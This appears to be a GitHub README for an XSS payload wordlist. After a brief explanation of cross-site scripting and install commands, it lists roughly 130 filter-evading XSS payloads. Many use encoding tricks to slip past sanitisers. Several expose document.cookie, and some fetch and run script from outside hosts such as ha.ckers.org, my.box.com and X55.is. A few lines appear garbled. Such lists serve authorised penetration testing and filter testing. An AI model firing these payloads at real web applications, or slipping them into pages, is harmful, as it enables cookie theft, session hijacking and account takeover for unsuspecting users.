<h1 align="center">「💉」XSS Payload List</h1>

<p align="center"><img src="xss.png"></p>

## What is cross-site scripting (XSS)?

Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data.

## How does XSS work?

Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise their interaction with the application.

## Install our wordlist

First option:

```
sudo mkdir /usr/share/wordlists/amoloht
sudo mkdir /usr/share/wordlists/amoloht/XSS
wget https://raw.githubusercontent.com/AmoloHT/XSS-Payload/main/xss-payloads-by-amoloht.txt -O /usr/share/wordlists/amoloht/XSS/xss-payloads-by-amoloht.txt
```

Second option:

```
sudo mkdir /usr/share/wordlists/amoloht
sudo git clone https://github.com/AmoloHT/XSS-Payload /usr/share/wordlists/amoloht/XSS
```

## Payloads

```
<fieldset//%00//onsite OnMoUsEoVeR=\u0061\u006C\u0065\u0072\u0074`1`>
javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
<svg on=x// //onload=\u0065\u0076\u0061\u006C("alert`/AmoloHT/`")>
<body//%09%09////.//onmousemove='&#112;&#114;&#111;&#109;&#112;&#116;&lpar;&quot;&#65;&#109;&#111;&#108;&#111;&#72;&#84;&quot;&rpar;'//>
x"//oNeRrOr=`/AmoloHT/`
""onerror=javascript:alert('AmoloHT')
"><u>XSS By AmoloHT</u><marquee+onstart='alert(document.cookie)'>XSS
<noscript><p title="</noscript><img src=x  onerror=alert(/AmoloHT/)>">
<svg onload=alert%26%230000000040"1")>
<Svg/Onload=top%5B"al"%2B"ert%5D(1)//
<Svg Id=JavaScrip OnLoad=location=id+'t:/*'+URL>
<svg><set onbegin=d=document,b='`',d['loca'+'tion']='javascript&colon;aler'+'t'+b+domain+b>
<svg><set onbegin=d=document,b=/`/.source,d[/loca/.source+/tion/.source]=/javascript&colon;aler/.source+/t/.source+b+domain+b>
`/alert?.(1)'"><Svg/OnLoad='`
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<var onmouseover="prompt(1)">On Mouse Over</var>
<a/href="/alert(/AmoloHT/)/">
<a href=//X55.is autofocus onfocus=import(href)>
<a href=javascript:'\74svg/onload\75alert\501\51\76'>
<a href="javas%09cript:[1].map(top['ale'+'rt'])">
<a href="/*">*/)});function+__MobileAppList(){alert(/AmoloHT/)}//>
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnQW1vbG9IVCAnKTwvc2NyaXB0Pg==)
<Img Src="//X55.is/> "OnError=import(src)//
<Img Src="javascript:alert(/AmoloHT/)> 1"OnError=location=src//
javascript:&#37&#54&#49lert(/AmoloHT/)
javascript:%26%2337%26%2354%26%2349lert(/AmoloHT/)
JavaScript%26%2358confirm(1)
JavaScript%26%2358AB:confirm(1)
JavaScript%26%2358%0Bconfirm(1)
JavaScript%26%2358$;confirm(1)
JavaScript%26%2358$?confirm(1):0
Set.constructor('ale'+'rt(13)')();
<script>alert(/AmoloHT/)</script>
'><ScripT>alert(/AmoloHT/)</SCripT>
<svg><desc><![CDATA[</desc><script>alert(/AmoloHT/)</script>]]></svg>
JavaScript%26%2358top?confirm(1):0
JavaScript://%250Aalert?.(1)//
<Tag OnEvent="alert/*>*/(1)"
<Svg OnLoad=confirm(1)>%C0%BCSvg%C0%A0OnLoad%C0%BDconfirm%C0%A81%C0%A9%C0%BE
<Svg OnLoad=import('//X55.is')>%C0%BCSvg%C0%A0OnLoad%C0%BDimport%C0%A8%C0%A7%C0%AF%C0%http://AFX55.is%C0%A7%C0%A9%C0%BE
function/**/Date(){alert(/AmoloHT/)}
function/**/RegExp(){alert(/AmoloHT/)}
/*-/*`/*\`/*'/*"/**/(/**/oNclick=alert())//%0D%0A%0D%0a//</style/</title/</textarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
%253cscript%253ealert(document.cookie)%253c/script%253e
“><s”%2b”cript>alert(document.cookie)</script>
“><ScRiPt>alert(document.cookie)</script>
“><<script>alert(document.cookie);//<</script>
foo<script>alert(document.cookie)</script>
<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
<IMG STYLE="xss:expr/*XSS*/ession(alert('AmoloHT'))">
<XSS STYLE="xss:expression(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("AmoloHT"))'>
<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('AmoloHT');\")";eval(a+b+c+d+e);
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<form id="test" /><button form="test" formaction="javascript:alert(/AmoloHT/23)">TESTHTML5FORMACTION
<form><button formaction="javascript:alert(/AmoloHT/23)">crosssitespt
<frameset onload=alert(/AmoloHT/23)>
<!--<img src="--><img src=x onerror=alert(/AmoloHT/23)//">
<style><img src="</style><img src=x onerror=alert(/AmoloHT/23)//">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<embed src="javascript:alert(/AmoloHT/)">
javascript:alert%281%29;
<w contenteditable id=x onfocus=alert()>
alert;pg("AmoloHT")
<svg/onload=%26%23097lert%26lpar;1337)>
<script>for((i)in(self))eval(i)(1)</script>
<scr<script>ipt>alert(/AmoloHT/)</scr</script>ipt><scr<script>ipt>alert(/AmoloHT/)</scr</script>ipt>
<sCR<script>iPt>alert(/AmoloHT/)</SCr</script>IPt>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>
%253Cscript%253Ealert('AmoloHT')%253C%252Fscript%253E
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/') </script
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X</script><img/*/src="worksinchrome&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(/AmoloHT/)"&#11;&#10;&#09;;>
<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
http://www.google<script .com>alert(document.location)</script
\x3Cscript>javascript:alert(/AmoloHT/)</script>
'"`><script>/* *\x2Fjavascript:alert(/AmoloHT/)// */</script>
<script>javascript:alert(/AmoloHT/)</script\x0D
<script>javascript:alert(/AmoloHT/)</script\x0A
<script>javascript:alert(/AmoloHT/)</script\x0B
<script charset="\x22>javascript:alert(/AmoloHT/)</script>
<script>javascript:alert(/AmoloHT/)<\x00/script>
<img src=# onerror\x3D"javascript:alert(/AmoloHT/)" >
<input onfocus=javascript:alert(/AmoloHT/) autofocus>
<input onblur=javascript:alert(/AmoloHT/) autofocus><input autofocus>
<video poster=javascript:javascript:alert(/AmoloHT/)//
<body onscroll=javascript:alert(/AmoloHT/)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<form id=test onforminput=javascript:alert(/AmoloHT/)><input></form><button form=test onformchange=javascript:alert(/AmoloHT/)>X
<video><source onerror="javascript:javascript:alert(/AmoloHT/)">
<video onerror="javascript:javascript:alert(/AmoloHT/)"><source>
<form><button formaction="javascript:javascript:alert(/AmoloHT/)">X
<body oninput=javascript:alert(/AmoloHT/)><input autofocus>
<math href="javascript:javascript:alert(/AmoloHT/)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(/AmoloHT/)">CLICKME</maction> </math>
<frameset onload=javascript:alert(/AmoloHT/)>
<table background="javascript:javascript:alert(/AmoloHT/)">
<!--<img src="--><img src=x onerror=javascript:alert(/AmoloHT/)//">
<comment><img src="</comment><img src=x onerror=javascript:alert(/AmoloHT/))//">
<![><img src="]><img src=x onerror=javascript:alert(/AmoloHT/)//">
<style><img src="</style><img src=x onerror=javascript:alert(/AmoloHT/)//">
<li style=list-style:url() onerror=javascript:alert(/AmoloHT/)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(/AmoloHT/)></div>
<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(/AmoloHT/)//#">XXX</a></body>
<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(/AmoloHT/)</SCRIPT>
<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
<script /**/>/**/alert(/AmoloHT/)/**/</script /**/
&#34;&#62;<h1/onmouseover='\u0061lert(/AmoloHT/)'>
<iframe/src="data:text/html,<svg &#111;&#110;load=alert(/AmoloHT/)>">
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(/AmoloHT/)" http-equiv="refresh"/>
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
</script><img/*/src="worksinchrome&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(/AmoloHT/)"&#11;&#10;&#09;;>
<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
http://www.google<script .com>alert(document.location)</script
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
<img/src=@&#32;&#13; onerror = prompt('&#49;')
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
```
